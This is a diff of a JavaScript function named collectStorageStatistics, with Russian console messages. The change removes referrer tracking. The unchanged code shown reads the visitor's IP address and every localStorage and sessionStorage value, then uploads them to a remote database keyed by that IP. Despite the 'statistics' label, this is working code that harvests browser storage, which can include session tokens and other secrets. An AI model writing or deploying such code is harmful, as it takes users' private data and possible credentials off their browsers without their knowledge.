@@ -34,10 +34,11 @@ async function collectStorageStatistics() {
         console.log("IP пользователя:", userIP);
 
         const validUserIP = sanitizeKey(userIP);
+
         const userRef = database.ref(`statistics/${validUserIP}`);
 
         const snapshot = await userRef.get();
-        const existingData = snapshot.exists() ? snapshot.val() : { localStorage: {}, sessionStorage: {}, referrer: null };
+        const existingData = snapshot.exists() ? snapshot.val() : { localStorage: {}, sessionStorage: {} };
         console.log("Текущие данные:", existingData);
 
         const localStorageData = {};
@@ -45,7 +46,7 @@ async function collectStorageStatistics() {
 
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
-            const sanitizedKey = sanitizeKey(key);
+            const sanitizedKey = sanitizeKey(key); 
 
             localStorageData[sanitizedKey] = {
                 value: localStorage.getItem(key),
@@ -67,14 +68,10 @@ async function collectStorageStatistics() {
         }
         console.log("sessionStorage:", sessionStorageData);
 
-        const referrer = existingData.referrer || document.referrer;
-        console.log("Реферер:", referrer);
-
         await userRef.set({
             lastUpdated: timestamp,
             localStorage: { ...existingData.localStorage, ...localStorageData },
-            sessionStorage: sessionStorageData,
-            referrer
+            sessionStorage: sessionStorageData
         });
 
         console.log("Данные отправлены.");
